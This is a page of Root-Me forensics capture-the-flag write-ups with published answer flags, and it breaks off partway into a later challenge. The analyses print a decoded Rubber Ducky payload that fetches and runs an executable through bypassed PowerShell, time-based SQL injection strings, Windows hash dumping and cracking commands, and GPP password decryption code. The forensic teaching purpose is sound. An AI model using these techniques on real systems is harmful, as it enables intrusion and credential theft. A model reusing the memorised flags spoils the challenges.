# [Root-Me](./rootme.md) Root-Me Forensics [8/28]

Train digital investigation skills by analyzing memory dumps, log files, network captures...

## Contents

1. [Command & Control - level 2](#command-and-control-level-2) 🗸
2. [Logs analysis - web attack](#logs-analysis-web-attack) 🗸
3. [Command & Control - level 5](#command-and-control-level-5) 🗸
4. [Find the cat](#find-the-cat) 🗸
5. [Ugly Duckling](#ugly-duckling) 🗸
6. [Active Directory - GPO](#active-directory-gpo) 🗸
7. [Command & Control - level 3](#command-and-control-level-3) 🗸
8. [DNS exfiltration](#dns-exfiltration)
9. [Command & Control - level 4](#command-and-control-level-4) 🗸
10. [Job interview](#job-interview)
11. [Homemade keylogger](#homemade-keylogger)
12. [macOS - Keychain](#macos-keychain)
13. [Malicious Word macro](#malicious-word-macro)
14. [Ransomware Android](#ransomware-android)
15. [Insomni’Droid](#insomnidroid)
16. [iOS - Introduction](#ios-introduction)
17. [Multi-devices](#multi-devices)
18. [Root My Droid](#root-my-droid)
19. [Rootkit - Cold case](#rootkit-cold-case)
20. [Command & Control - level 6](#command-and-control-level-6) 🗸
21. [Find me](#find-me)
22. [Second job interview](#second-job-interview)
23. [Find me again](#find-me-again)
24. [Find me back](#find-me-back)
25. [Find me on Android](#find-me-on-android)
26. [Zeus Bot](#zeus-bot)
27. [Try again](#try-again)
28. [The Lost Case - Mobile Investigation](#the-lost-case-mobile-investigation)

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Command and Control level 2

- Author: Thanat0s
- Date: 16 February 2013
- Points: 15
- Level: 2

### Statement

Congratulations Berthier, thanks to your help the computer has been identified. You have requested a memory dump but before starting your analysis you wanted to take a look at the antivirus’ logs. Unfortunately, you forgot to write down the workstation’s hostname. But since you have its memory dump you should be able to get it back!

The validation flag is the workstation’s hostname.

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de

### Resources

1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).

### Attachments

1. [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2).

### Solutions

<details>

<summary markdown="span">Solution</summary>

The challenge file can be retrieved, inspected and decompressed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
--2022-01-29 08:25:20--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185769248 (177M) [application/octet-stream]
Saving to: ‘ch2.tbz2’

ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  12.2MB/s    in 15s     

2022-01-29 08:25:36 (11.5 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
$ file ch2.tbz2 
ch2.tbz2: bzip2 compressed data, block size = 900k
$ bzip2 -d ch2.tbz2
$ ls
ch2.tar
$ tar -xvf ch2.tar 
ch2.dmp
$ file ch2.dmp
ch2.dmp: data
~~~

Using [volatility](http://www.volatilityfoundation.org/#!releases/component_71401), the memory dump can be investigated:

~~~shell
$ vol.py -f ch2.dmp imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100
~~~

This provides the profile and shows the memory dump is from a Windows machine.  The hives can be dumped to get the offset for the SYSTEM REGISTRY where the hostname is stored:

~~~shell
$ vol.py -f ch2.dmp --profile=Win7SP0x86 hivelist
Volatility Foundation Volatility Framework 2.6.1
Virtual    Physical   Name
---------- ---------- ----
0x8ee66740 0x141c0740 \SystemRoot\System32\Config\SOFTWARE
0x90cab9d0 0x172ab9d0 \SystemRoot\System32\Config\DEFAULT
0x9670e9d0 0x1ae709d0 \??\C:\Users\John Doe\ntuser.dat
0x9670f9d0 0x04a719d0 \??\C:\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat
0x9aad6148 0x131af148 \SystemRoot\System32\Config\SAM
0x9ab25008 0x14a61008 \SystemRoot\System32\Config\SECURITY
0x9aba79d0 0x11a259d0 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0x9abb1720 0x0a7d4720 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0x8b20c008 0x039e1008 [no name]
0x8b21c008 0x039ef008 \REGISTRY\MACHINE\SYSTEM
0x8b23c008 0x02ccf008 \REGISTRY\MACHINE\HARDWARE
0x8ee66008 0x141c0008 \Device\HarddiskVolume1\Boot\BCD
~~~

The hostname can be found:

~~~shell
$ vol.py -f ch2.dmp --profile=Win7SP0x86 printkey -o 0x8b21c008 -K 'ControlSet001\Control\ComputerName\ComputerName'
Volatility Foundation Volatility Framework 2.6.1

Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2013-01-12 00:58:30 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-ETSA91RKCFP
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
WIN-ETSA91RKCFP
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Logs analysis web attack

- Author: sambecks
- Date: 05 July 2015
- Points: 25
- Level: 3

### Statement

Our website appears to have been attacked, but our system administrator does not understand web server logs. Can you find out if any data has been stolen ?

### Attachments

1. [ch13.txt](http://challenge01.root-me.org/forensic/ch13/ch13.txt).

### Solutions

<details>

<summary markdown="span">Solution</summary>

The challenge file can be opened:

~~~
192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
...
192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDIxLDEpKSksNywxKSksY2hhcig0OCksY2hhcig0OSkpIHdoZW4gMSB0aGVuIHNsZWVwKDIpIHdoZW4gMiB0aGVuIHNsZWVwKDQpICBlbmQpIGZyb20gbWVtYnJlcyB3aGVyZSBpZD0xKQ%3D%3D HTTP/1.1" 200 833 "-" "-"

~~~

This shows a series of HTTP GET requests to the site admin page.  The form submission includes "action=membres" and "order=XXX" where XXX is a base64 encoded string.

Extracting the base64 string, the decoded strings can be found:

~~~
ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
...
ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
~~~

This shows a SQL Injection attack on user id=1's password.  The attack compares 2 password bits to char(48) and char(49)... 0 and 1 and sleeps for 0 if it is 00, 2 is it if 01, 4 if it is 10 or 6 if it is 11.  The 4th inject compares a single bit to 0 or 1.  The decompilation can be automated in Python:

~~~py
import base64 as b64 
from datetime import datetime as dt
file = "ch13.txt"

f = open(file,"r")
lines = f.read().split("\n")[:-1]
times = []
for line in lines:
    timestr = line[30:38]
    dtg = dt.strptime(timestr,'%H:%M:%S')
    times.append(dtg)

tdelta = []

for i in range(1,len(times)):
    tdelta.append(int(str(times[i]-times[i-1])[-2:]))
    
binstr = ""
binarr = []
intarr = []
answer = ""

for i in range(len(lines)-1):
    td = tdelta[i]
    b64str = lines[i][80:]
    b64str = b64str.split(" HTTP")[0]
    b64str = b64str.split("%3D")[0]
    appends = (4-len(b64str)%4)%4
    b64str += "="*appends
    asciistr = b64.b64decode(b64str).decode()
    if "TRUE" in asciistr:
        if td == 0:
            binstr += "00"
        elif td == 2:
            binstr += "01"
        elif td == 4:
            binstr += "10"
        elif td == 6:
            binstr += "11"
    else:
        if td == 2:
            binstr += "0"
        elif td==4:
            binstr += "1"
        binarr.append(binstr)
        intarr.append(int(binstr,2))
        answer += chr(int(binstr,2))
        binstr = ""
        
print(answer)
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
g9UWD8EZgBhBpc4nTSAS
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Command and Control level 5

- Author: Thanat0s
- Date: 16 February 2013
- Points: 25
- Level: 3

### Statement

Berthier, the malware seems to be manually maintened on the workstations. Therefore it’s likely that the hackers have found all of the computers’ passwords.
Since ACME’s computer fleet seems to be up to date, it’s probably only due to password weakness. John, the system administrator doesn’t believe you. Prove him wrong!

Find john password.

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de

### Resources

1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).

### Link

1. [ch5.php](http://challenge01.root-me.org/forensic/ch5/ch5.php).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  THis can be downloaded, decompiled and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185769248 (177M) [application/octet-stream]
Saving to: ‘ch2.tbz2’

ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     

2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
$ bzip2 -d ch2.tbz2 
$ file 
ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
$ tar -xvf ch2.tar 
ch2.dmp
$ file ch2.dmp 
ch2.dmp: data
~~~

The memory dump can be investigated:

~~~shell
$ volatility imageinfo -f ch2.dmp
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100

~~~

This provides the profile and shows the memory dump is from a Windows machine.  The hives can be dumped to get the offset for the relevant SYSTEM and SAM dumps:

~~~shell
$ volatility -f ch2.dmp hivelist --profile=Win7SP0x86
Volatility Foundation Volatility Framework 2.6.1
Virtual    Physical   Name
---------- ---------- ----
0x8ee66740 0x141c0740 \SystemRoot\System32\Config\SOFTWARE
0x90cab9d0 0x172ab9d0 \SystemRoot\System32\Config\DEFAULT
0x9670e9d0 0x1ae709d0 \??\C:\Users\John Doe\ntuser.dat
0x9670f9d0 0x04a719d0 \??\C:\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat
0x9aad6148 0x131af148 \SystemRoot\System32\Config\SAM
0x9ab25008 0x14a61008 \SystemRoot\System32\Config\SECURITY
0x9aba79d0 0x11a259d0 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0x9abb1720 0x0a7d4720 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0x8b20c008 0x039e1008 [no name]
0x8b21c008 0x039ef008 \REGISTRY\MACHINE\SYSTEM
0x8b23c008 0x02ccf008 \REGISTRY\MACHINE\HARDWARE
0x8ee66008 0x141c0008 \Device\HarddiskVolume1\Boot\BCD
~~~

The password hashes can be exported:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 hashdump -y 0x8b21c008 -s 0x9aad6148 > hashes.txt
Volatility Foundation Volatility Framework 2.6.1
$ cat hashes.txt 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Doe:1000:aad3b435b51404eeaad3b435b51404ee:b9f917853e3dbf6e6831ecce60725930:::
~~~

This can be cracked using hashcat:

~~~shell
$ hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt -o cracked.txt
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
passw0rd
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Find the cat

- Author: Thanat0s
- Date: 28 July 2013
- Points: 25
- Level: 3

### Statement

The president’s cat was kidnapped by separatists. A suspect carrying a USB key has been arrested. Berthier, once again you have to save the Republic! Analyze this key and find out in which city the cat is retained!

The md5sum of the archive is edf2f1aaef605c308561888079e7f7f7. Input the city name in lowercase.

### Resources

1. [Data sanitization and recovery](https://repository.root-me.org/Forensic/EN%20-%20Data%20sanitization%20and%20recovery.pdf).

### Link

1. [ch9.gz](http://challenge01.root-me.org/forensic/ch9/ch9.gz)

### Solutions

<details>

<summary markdown="span">Solution</summary>

The challenge archive can be downloaded, inflated and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch9/ch9.gz
--2022-01-29 17:46:33--  http://challenge01.root-me.org/forensic/ch9/ch9.gz
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12314757 (12M) [application/octet-stream]
Saving to: ‘ch9.gz’

ch9.gz                                                      100%[=========================================================================================================================================>]  11.74M  5.80MB/s    in 2.0s    

2022-01-29 17:46:35 (5.80 MB/s) - ‘ch9.gz’ saved [12314757/12314757]
$ gzip -d ch9.gz 
$ file ch9 
ch9: DOS/MBR boot sector; partition 1 : ID=0xb, start-CHS (0x0,32,33), end-CHS (0x10,81,1), startsector 2048, 260096 sectors, extended partition table (last)
~~~

The partition image can be mounted:

~~~shell
$ sudo mkdir /mnt/tmp
$ fdisk -l ch9
Disk ch9: 128 MiB, 134217728 bytes, 262144 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xc5ce543f

Device Boot Start    End Sectors  Size Id Type
ch9p1        2048 262143  260096  127M  b W95 FAT32
$ sudo mount -o ro,loop,offset=1048576 ch9 /mnt/tmp
~~~

The disk can be unmounted and files recovered:

~~~shell
$ sudo umount ch9
$ sudo testdisk ch9
~~~

A lostfile can be found in /Files/revendications.odt.  Opening this shows an image of the cat.  This can be saved locally and exiftool can be used to recover the gps coordinates:

~~~shell
$ exiftool cat.jpg 
ExifTool Version Number         : 11.88
File Name                       : cat.jpg
Directory                       : .
File Size                       : 2.2 MB
File Modification Date/Time     : 2022:01:29 18:23:14+00:00
File Access Date/Time           : 2022:01:29 18:23:14+00:00
File Inode Change Date/Time     : 2022:01:29 18:23:14+00:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Make                            : Apple
Camera Model Name               : iPhone 4S
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : 6.1.2
Modify Date                     : 2013:03:11 11:47:07
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/20
F Number                        : 2.4
Exposure Program                : Program AE
ISO                             : 160
Exif Version                    : 0221
Date/Time Original              : 2013:03:11 11:47:07
Create Date                     : 2013:03:11 11:47:07
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/20
Aperture Value                  : 2.4
Brightness Value                : 1.477742947
Metering Mode                   : Multi-segment
Flash                           : Off, Did not fire
Focal Length                    : 4.3 mm
Subject Area                    : 1631 1223 881 881
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 3264
Exif Image Height               : 2448
Sensing Method                  : One-chip color area
Exposure Mode                   : Auto
White Balance                   : Auto
Focal Length In 35mm Format     : 35 mm
Scene Capture Type              : Standard
GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 07:46:50.85
GPS Img Direction Ref           : True North
GPS Img Direction               : 247.3508772
Compression                     : JPEG (old-style)
Thumbnail Offset                : 902
Thumbnail Length                : 8207
Image Width                     : 3264
Image Height                    : 2448
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Aperture                        : 2.4
Image Size                      : 3264x2448
Megapixels                      : 8.0
Scale Factor To 35 mm Equivalent: 8.2
Shutter Speed                   : 1/20
Thumbnail Image                 : (Binary data 8207 bytes, use -b option to extract)
GPS Altitude                    : 16.7 m Above Sea Level
GPS Latitude                    : 47 deg 36' 16.15" N
GPS Longitude                   : 7 deg 24' 52.48" E
Circle Of Confusion             : 0.004 mm
Field Of View                   : 54.4 deg
Focal Length                    : 4.3 mm (35 mm equivalent: 35.0 mm)
GPS Position                    : 47 deg 36' 16.15" N, 7 deg 24' 52.48" E
Hyperfocal Distance             : 2.08 m
Light Value                     : 6.2
~~~

This can be entered into google maps to find the city.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
helfrantzkirch
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Ugly Duckling

- Author: eilco
- Date: 24 April 2017
- Points: 25
- Level: 3

### Statement

The CEO’s computer seems to have been compromised internally. A young trainee dissatisfied with not having been paid during his internship arouse our supsicion. A strange USB stick containing a binary file was found on the trainee’s desk. The CEO relies on you to analyze this file.

### Link

1. [ch14.zip](http://challenge01.root-me.org/forensic/ch14/ch14.zip)

### Solutions

<details>

<summary markdown="span">Solution</summary>

The challenge archive can be downloaded, inflated and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch14/ch14.zip
--2022-01-29 18:29:16--  http://challenge01.root-me.org/forensic/ch14/ch14.zip
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 771 [application/zip]
Saving to: ‘ch14.zip’

ch14.zip                                                    100%[=========================================================================================================================================>]     771  --.-KB/s    in 0s      

2022-01-29 18:29:16 (282 MB/s) - ‘ch14.zip’ saved [771/771]
$ unzip ch14.zip 
Archive:  ch14.zip
  inflating: file.bin                
$ ls
ch14.zip  file.bin
$ file file.bin 
file.bin: data
~~~

The challenge suggests this is a ducky encoded injection file.  It can be decoded using an [online tool](https://ducktoolkit.com/decode#):

~~~
DELAY
iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpgENTER
DELAY
DELAY
ENTER
DELAY
DELAY
%USERPROFILE%\Documents\796f75277665206265656e2054524f4c4c4544.jpgDELAY
ENTER
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
ENTER
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
ENTER
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
ENTER
DELAY
powershell Start-Process powershell -Verb runAsDELAY
PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
~~~

Decoding the bas64 string, a downloadable executable can be found. 

~~~
iex (New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe');
~~~

This executable can be decompiled in Ghidra and the flag can be found as a string in the executable memory.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
RubberDuckyFail3D
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Active Directory GPO

- Author: N1lux
- Date: 17 June 2015
- Points: 30
- Level: 3

### Statement

During a security audit, the network traffic during the boot sequence of a workstation enrolled in an Active Directory was recorded. Analyze this capture and find the administrator’s password.

### Link

1. [ch12.pcap](http://challenge01.root-me.org/forensic/ch12/ch12.pcap)

### Solutions

<details>

<summary markdown="span">Solution</summary>

The challenge archive can be downloaded and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch12/ch12.pcap
--2022-01-29 19:01:44--  http://challenge01.root-me.org/forensic/ch12/ch12.pcap
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171915 (168K) [application/octet-stream]
Saving to: ‘ch12.pcap’

ch12.pcap                                                   100%[=========================================================================================================================================>] 167.89K   382KB/s    in 0.4s    

2022-01-29 19:01:44 (382 KB/s) - ‘ch12.pcap’ saved [171915/171915]
$ file ch12.pcap 
ch12.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
~~~

The challenge details the pcap has cpatured the AD initialisation.  The SMB encapsulated objects can be exported using tshark:

~~~shell
$ tshark -r ch12.pcap --export-objects "smb,./"
$ ls
 %5cnilux.me%5cPolicies%5c{1A3EE4C4-70BE-49B8-B0B0-33C8EEBD3598}%5cgpt.ini                                                     %5csrvsvc
'%5cnilux.me%5cPolicies%5c{1A3EE4C4-70BE-49B8-B0B0-33C8EEBD3598}%5cMachine%5cMicrosoft%5cWindows NT%5cSecEdit%5cGptTmpl.inf'   
 %5cnilux.me%5cPolicies%5c{31B2F340-016D-11D2-945F-00C04FB984F9}%5cgpt.ini                                                     
'%5cnilux.me%5cPolicies%5c{31B2F340-016D-11D2-945F-00C04FB984F9}%5cMachine%5cMicrosoft%5cWindows NT%5cSecEdit%5cGptTmpl.inf'   
 %5cnilux.me%5cPolicies%5c{F60A1B1E-75E4-46B7-BB73-281F9340A2B7}%5cgpt.ini                                                     
 %5cnilux.me%5cPolicies%5c{F60A1B1E-75E4-46B7-BB73-281F9340A2B7}%5cMachine%5cPreferences%5cGroups%5cGroups.xml
~~~

The files can be searched for a password string:

~~~shell
$ grep "password" %5*
%5cnilux.me%5cPolicies%5c{F60A1B1E-75E4-46B7-BB73-281F9340A2B7}%5cMachine%5cPreferences%5cGroups%5cGroups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Helpdesk" image="2" changed="2015-05-06 05:50:08" uid="{43F9FF29-C120-48B6-8333-9402C927BE09}"><Properties action="U" newName="" fullName="" description="" cpassword="PsmtscOuXqUMW6KQzJR8RWxCuVNmBvRaDElCKH+FU+w" changeLogon="1" noChange="0" neverExpires="0" acctDisabled="0" userName="Helpdesk"/></User><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrateur" image="2" changed="2015-05-05 14:19:53" uid="{5E34317F-8726-4F7C-BF8B-91B2E52FB3F7}" userContext="0" removePolicy="0"><Properties action="U" newName="" fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrateur"/></User>
~~~

Reviewing the xml file, we can see the password hashes:

~~~xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Helpdesk" image="2" changed="2015-05-06 05:50:08" uid="{43F9FF29-C120-48B6-8333-9402C927BE09}">
<Properties action="U" newName="" fullName="" description="" cpassword="PsmtscOuXqUMW6KQzJR8RWxCuVNmBvRaDElCKH+FU+w" changeLogon="1" noChange="0" neverExpires="0" acctDisabled="0" userName="Helpdesk"/>
</User>
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrateur" image="2" changed="2015-05-05 14:19:53" uid="{5E34317F-8726-4F7C-BF8B-91B2E52FB3F7}" userContext="0" removePolicy="0">
<Properties action="U" newName="" fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrateur"/>
</User>
</Groups>
~~~

Two password hashes are found encoded in base64:

~~~
Administrateur:LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0
Helpdesk:PsmtscOuXqUMW6KQzJR8RWxCuVNmBvRaDElCKH+FU+w
~~~

These can be converted to hex using an [online tool](https://base64.guru/converter/decode/hex):

~~~
2e315640ccd2dc658379abfbfb4434a12a0e338dd5c03df46190d5688b63f1ed
3ec9adb1c3ae5ea50c5ba290cc947c456c42b9536606f45a0c4942287f8553ec
~~~

This key is encrypted using AES256.  The default Microsoft GPPREF AES key can be found [online](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be).

~~~shell
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
~~~

The key and CT password can be decrypted in python:

~~~py
from Crypto.Cipher import AES
import binascii

ct = 0x2e315640ccd2dc658379abfbfb4434a12a0e338dd5c03df46190d5688b63f1ed
ky = 0x4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
cthex = binascii.unhexlify(hex(ct)[2:])
kyhex = binascii.unhexlify(hex(ky)[2:])
iv = ("\x00"*16).encode()

dec_alg = AES.new(kyhex, AES.MODE_CBC, iv)
pt = dec_alg.decrypt(cthex).decode()
pt = "".join(pt.split("\x00"))
pt = "".join(pt.split("\n"))
print(pt)
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
TuM@sTrouv3
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Command and Control level 3

- Author: Thanat0s
- Date: 16 February 2013
- Points: 30
- Level: 3

### Statement

Berthier, the antivirus software didn’t find anything. It’s up to you now. Try to find the malware in the memory dump. The validation flag is the md5 checksum of the full path of the executable.

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de

### Resources

